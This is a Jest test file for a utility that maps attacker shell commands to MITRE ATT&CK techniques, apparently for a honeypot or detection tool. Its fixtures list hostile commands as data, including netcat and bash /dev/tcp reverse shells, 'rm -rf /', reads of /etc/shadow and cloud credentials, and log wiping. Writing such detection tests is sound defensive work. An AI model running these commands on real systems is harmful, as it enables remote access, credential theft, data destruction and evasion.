const mitreMapping = require('../utils/mitreMapping')
const logger = require('../utils/logger')
const { TECHNIQUES, TACTICS, t, tacticsFor, withTactics, ATTACK_VERSION } = require('../utils/attackTechniques')

jest.mock('../utils/logger', () => ({
  warn: jest.fn(),
  info: jest.fn(),
  error: jest.fn(),
}))

describe('MITRE ATT&CK Mapping Utility', () => {
  beforeEach(() => {
    jest.clearAllMocks()
  })

  // Rank 8: an intent maps to a generic technique only when that technique is true for EVERY command producing the
  // intent; otherwise it maps to [] and its commands are mapped individually. (This test used to require a parent
  // technique for every intent, which is how on-host reconnaissance ended up as T1595 Active Scanning.)
  test('every intent maps to verified techniques, or explicitly to per-command mapping only', () => {
    const intents = Object.keys(mitreMapping.MITRE_ATTACK_MAP)
    expect(intents.sort()).toEqual(
      [
        'CREDENTIAL_HARVEST',
        'DESTRUCTION',
        'MALWARE_DOWNLOAD',
        'PERSISTENCE',
        'PRIVILEGE_ESCALATION',
        'RECONNAISSANCE',
        'REVERSE_SHELL',
      ].sort()
    )
    expect(mitreMapping.getMitreTechniquesForIntents(['MALWARE_DOWNLOAD']).map((t) => t.id)).toEqual(['T1105'])
    expect(mitreMapping.getMitreTechniquesForIntents(['REVERSE_SHELL']).map((t) => t.id)).toEqual(['T1059'])
    for (const intent of ['CREDENTIAL_HARVEST', 'PERSISTENCE', 'PRIVILEGE_ESCALATION', 'RECONNAISSANCE', 'DESTRUCTION'])
      expect(mitreMapping.getMitreTechniquesForIntents([intent])).toEqual([])
    expect(logger.warn).not.toHaveBeenCalled()
    for (const intent of intents)
      for (const tech of mitreMapping.getMitreTechniquesForIntents([intent])) {
        expect(tech.id).toMatch(/^T\d{4}(\.\d{3})?$/)
        expect(tech.name).toBe(TECHNIQUES[tech.id].name)
        expect(tech.tactics).toEqual(TECHNIQUES[tech.id].tactics)
      }
  })

  test('should map every attackType in THREAT_MITRE_MAP to valid technique details', () => {
    const threats = Object.keys(mitreMapping.THREAT_MITRE_MAP)
    expect(threats.length).toBeGreaterThan(0)

    threats.forEach((threat) => {
      const techniques = mitreMapping.getMitreTechniquesForThreat(threat)
      expect(techniques).toBeInstanceOf(Array)
      expect(techniques.length).toBeGreaterThan(0)

      techniques.forEach((tech) => {
        expect(tech).toHaveProperty('id')
        expect(tech).toHaveProperty('name')
        // sub-techniques are valid ids (e.g. T1110.004 Credential Stuffing)
        expect(tech.id).toMatch(/^T\d{4}(\.\d{3})?$/)
        expect(tech.name).toBe(TECHNIQUES[tech.id].name)
        expect(tech.tactics.length).toBeGreaterThan(0)
      })
    })
  })

  test('should return empty list and log a warning for an unmapped intent', () => {
    const techniques = mitreMapping.getMitreTechniquesForIntents(['UNMAPPED_INTENT_XYZ'])
    expect(techniques).toEqual([])
    expect(logger.warn).toHaveBeenCalledTimes(1)
    expect(logger.warn.mock.calls[0][0]).toContain('No MITRE technique mapping found for intent: "UNMAPPED_INTENT_XYZ"')
  })

  test('should return empty list and log a warning for an unmapped threat attackType', () => {
    const techniques = mitreMapping.getMitreTechniquesForThreat('Unmapped Attack Type ABC')
    expect(techniques).toEqual([])
    expect(logger.warn).toHaveBeenCalledTimes(1)
    expect(logger.warn.mock.calls[0][0]).toContain(
      'No MITRE technique mapping found for threat attackType: "Unmapped Attack Type ABC"'
    )
  })

  test('should ignore UNKNOWN or empty intent values without warning', () => {
    const techniques = mitreMapping.getMitreTechniquesForIntents(['UNKNOWN', '', null, undefined])
    expect(techniques).toEqual([])
    expect(logger.warn).not.toHaveBeenCalled()
  })

  test('should return empty list and not log warning for "Unknown" threat type', () => {
    const techniques = mitreMapping.getMitreTechniquesForThreat('Unknown')
    expect(techniques).toEqual([])
    expect(logger.warn).not.toHaveBeenCalled()
  })
})

describe('Rank 8: ATT&CK accuracy, tactics and persona gating (ATT&CK Enterprise v20.1)', () => {
  const ids = (cmds, persona) =>
    mitreMapping.getMitreTechniquesForCommands([].concat(cmds), { persona }).map((x) => x.id)
  const session = (cmds, persona) =>
    mitreMapping
      .getMitreTechniquesForSession(
        [].concat(cmds).map((command) => ({ command, intent: 'RECONNAISSANCE' })),
        { persona }
      )
      .map((x) => x.id)

  test('the table is the verified v20.1 table and every tactic is a real tactic', () => {
    expect(ATTACK_VERSION).toMatch(/v20\.1/)
    const tacticNames = new Set(Object.values(TACTICS))
    for (const [id, entry] of Object.entries(TECHNIQUES)) {
      expect(id).toMatch(/^T\d{4}(\.\d{3})?$/)
      expect(entry.tactics.length).toBeGreaterThan(0)
      for (const tactic of entry.tactics) expect(tacticNames).toContain(tactic)
    }
    expect(() => t('T9999')).toThrow(/not in the verified table/)
    expect(TECHNIQUES.T1595.tactics).toEqual(['Reconnaissance'])
    expect(TECHNIQUES['T1222.002'].name).toBe('Linux and Mac Permissions')
    expect(TECHNIQUES['T1685.005']).toEqual({ name: 'Clear Windows Event Logs', tactics: ['Defense Impairment'] })
    expect(TECHNIQUES.T1686.name).toBe('Disable or Modify System Firewall')
    expect(TECHNIQUES.T1027.tactics).toEqual(['Stealth'])
  })

  test('every rule references a verified technique with tactics', () => {
    const windows = require('../utils/windowsPersona').WINDOWS_COMMAND_TECHNIQUES
    for (const [, tech] of [...mitreMapping.COMMAND_TECHNIQUES, ...windows]) {
      expect(TECHNIQUES[tech.id]).toBeDefined()
      expect(tech.name).toBe(TECHNIQUES[tech.id].name)
      expect(tech.tactics).toEqual(TECHNIQUES[tech.id].tactics)
    }
  })

  test('on-host reconnaissance is Discovery, never T1595 Active Scanning', () => {
    const got = session(['uname -a', 'id', 'whoami', 'ifconfig'])
    expect(got).toEqual(expect.arrayContaining(['T1082', 'T1033', 'T1016']))
    expect(got).not.toContain('T1595')
    for (const id of got) expect(tacticsFor(id)).toEqual(['Discovery'])
    // T1595 remains only where it belongs: a port scan observed in network traffic
    expect(mitreMapping.getMitreTechniquesForThreat('Port Scan').map((x) => x.id)).toEqual(['T1595', 'T1046'])
  })

  test('corrected Linux mappings', () => {
    expect(ids('chmod +x payload.sh')).toEqual(['T1222.002'])
    expect(ids('chmod u+s /bin/bash')).toEqual(['T1548.001'])
    expect(ids('iptables -F')).toEqual(['T1686'])
    expect(ids('setenforce 0')).toEqual(['T1685'])
    expect(ids('unset HISTFILE')).toEqual(['T1690'])
    expect(ids('history -c')).toEqual(['T1070.003'])
    expect(ids('nc 198.51.100.7 4444 -e /bin/sh')).toEqual(['T1095'])
    expect(ids('bash -i >& /dev/tcp/198.51.100.7/4444 0>&1')).toEqual(['T1059.004', 'T1095'])
    expect(ids('rm -rf /')).toEqual(['T1485'])
    expect(ids('rm -rf /tmp/x')).toEqual([]) // own clean-up is not data destruction
    expect(ids('cat /root/.aws/credentials')).toEqual(['T1552.001'])
    expect(ids('cat /etc/shadow')).toEqual(['T1003.008'])
  })

  test('clearing Linux system logs is T1685.006, never the Windows T1685.005', () => {
    for (const c of [
      'rm -f /var/log/auth.log',
      'rm -rf /var/log/*',
      'shred -u /var/log/wtmp',
      'truncate -s 0 /var/log/syslog',
      'cat /dev/null > /var/log/btmp',
      '> /var/log/lastlog',
      'echo > /var/log/auth.log',
      'journalctl --vacuum-time=1s',
    ])
      expect([c, ids(c)]).toEqual([c, ['T1685.006']])
    for (const c of [
      'cat /var/log/auth.log',
      'tail -n 50 /var/log/syslog',
      'echo x >> /var/log/app.log',
      'journalctl -xe',
    ])
      expect([c, ids(c)]).toEqual([c, []])
    expect(TECHNIQUES['T1685.006']).toEqual({ name: 'Clear Linux or Mac System Logs', tactics: ['Defense Impairment'] })
    // persona-specific: the Windows event-log id never reaches a Linux session, the Linux id never a Windows command
    expect(ids('rm -f /var/log/auth.log')).not.toContain('T1685.005')
    expect(ids('wevtutil cl Security', 'windows_srv')).not.toContain('T1685.006')
  })

  test('unknown behaviour gets no invented technique', () => {
    expect(ids(['ls -la', 'echo hello', 'frobnicate --x', 'cd /tmp'])).toEqual([])
    expect(session(['ls -la'])).toEqual([])
  })

  test('Windows-only techniques never reach a Linux session (persona gating)', () => {
    for (const cmd of [
      'systeminfo',
      'tasklist /svc',
      'net user',
      'type C:\\inetpub\\wwwroot\\web.config',
      'wevtutil cl Security',
      'cat web.config',
      'powershell -c Get-Process',
      'cmd /c whoami',
      'icacls C:\\Temp /grant x:F',
    ]) {
      const linux = ids(cmd)
      const windows = ids(cmd, 'windows_srv')
      for (const id of linux) expect(windows).toContain(id) // gating only ever adds
      // a Linux session gets exactly what the Linux rule set alone produces
      const linuxOnly = []
      for (const [pattern, tech] of mitreMapping.COMMAND_TECHNIQUES)
        if (!linuxOnly.includes(tech.id) && pattern.test(cmd)) linuxOnly.push(tech.id)
      expect(linux).toEqual(linuxOnly)
    }
    expect(ids('systeminfo')).toEqual([])
    expect(ids('systeminfo', 'windows_srv')).toEqual(['T1082'])
    expect(ids('cat web.config')).toEqual([])
    expect(ids('type C:\\inetpub\\wwwroot\\web.config', 'windows_srv')).toEqual(['T1552.001'])
    expect(ids('wevtutil cl Security', 'windows_srv')).toEqual(['T1685.005'])
    expect(ids('whoami', 'ubuntu_22')).toEqual(['T1033'])
  })

  test('stored records keep {id, name}; tactics are attached when read', () => {
    const stored = mitreMapping.storedForm(mitreMapping.getMitreTechniquesForCommands(['uname -a']))
    expect(stored).toEqual([{ id: 'T1082', name: 'System Information Discovery' }])
    expect(withTactics(stored[0])).toEqual({
      id: 'T1082',
      name: 'System Information Discovery',
      tactics: ['Discovery'],
    })
    expect(tacticsFor('T0000')).toEqual([])
  })
})
